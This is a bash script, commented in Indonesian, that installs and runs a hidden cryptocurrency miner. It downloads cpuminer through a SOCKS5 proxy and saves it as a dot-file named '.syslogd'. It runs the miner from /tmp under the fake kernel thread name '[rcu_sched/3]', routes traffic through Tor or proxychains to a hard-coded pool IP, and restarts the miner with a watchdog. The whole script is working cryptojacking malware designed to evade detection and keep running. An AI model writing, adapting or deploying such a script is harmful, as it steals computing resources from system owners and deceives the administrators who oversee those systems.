#!/bin/bash
set -e

# ====[ Konfigurasi ]====
BASE_WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9"
WORKER="$(tr -dc a-z0-9 </dev/urandom | head -c 6)"
WALLET="$BASE_WALLET.$(tr -dc a-z0-9 </dev/urandom | head -c 6)"

POOL="stratum+tcp://159.223.48.143:443"
ALGO="power2b"
THREADS=$(( $(nproc --all) / 1 ))
BIN_NAME=".syslogd"
PROCESS_NAME="[rcu_sched/3]"
LOG_FILE=".xlog"
PROXY="socks5h://101.38.175.192:8081"

# ====[ DNS over HTTPS Setup (jika curl DoH tersedia) ]====
export RESOLVE_DOH="https://dns.google/dns-query"
export HTTPS_PROXY="$PROXY"
export ALL_PROXY="$PROXY"

# ====[ Cek torsocks atau proxychains4 ]====
USE_TOR=false
if command -v torsocks >/dev/null 2>&1; then
    USE_TOR=true
elif command -v proxychains4 >/dev/null 2>&1; then
    USE_TOR=false
else
    echo "[WARN] Tidak ada torsocks/proxychains. Lanjut tanpa proxy SOCKS5"
fi

# ====[ Unduh miner jika belum ada ]====
if [ ! -f "$BIN_NAME" ]; then
    echo "[INFO] Mengunduh miner..."
    curl --socks5-hostname 101.38.175.192:8081 -L --dns-url "$RESOLVE_DOH" --connect-timeout 10 \
        -o miner.tgz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz || \
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz -O miner.tgz

    tar -xf miner.tgz
    mv cpuminer-sse2 "$BIN_NAME"
    chmod +x "$BIN_NAME"
    rm -f miner.tgz
fi

# ====[ Jalankan Miner Stealth ]====
run_miner() {
    while true; do
        cp "$BIN_NAME" "/tmp/$BIN_NAME.$$"
        chmod +x "/tmp/$BIN_NAME.$$"
        rm -f "$BIN_NAME"

        CMD="/tmp/$BIN_NAME.$$ -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS"

        if [ "$USE_TOR" = true ]; then
            exec -a "$PROCESS_NAME" torsocks $CMD >> "$LOG_FILE" 2>&1
        elif command -v proxychains4 >/dev/null 2>&1; then
            exec -a "$PROCESS_NAME" proxychains4 -f proxychains.conf $CMD >> "$LOG_FILE" 2>&1
        else
            exec -a "$PROCESS_NAME" $CMD >> "$LOG_FILE" 2>&1
        fi

        echo "[WARN] Miner keluar. Mengulang..." >> "$LOG_FILE"
        sleep 3
    done
}

# ====[ Watchdog anti-dismiss ]====
watchdog_loop() {
    while true; do
        sleep 10
        PID=$(pgrep -fa "$PROCESS_NAME" | grep -v grep | awk '{print $1}')
        if [ -z "$PID" ]; then
            echo "[WATCHDOG] Miner mati. Restart..." >> "$LOG_FILE"
            nohup bash "$0" > /dev/null 2>&1 &
            exit 0
        fi
    done
}

if [[ "$1" == "--watchdog" ]]; then
    watchdog_loop
    exit 0
fi

(run_miner &) &
(bash "$0" --watchdog &) &
disown -a

echo "[INFO] SOCKS5 Stealth Miner + DoH + Worker Acak Aktif"
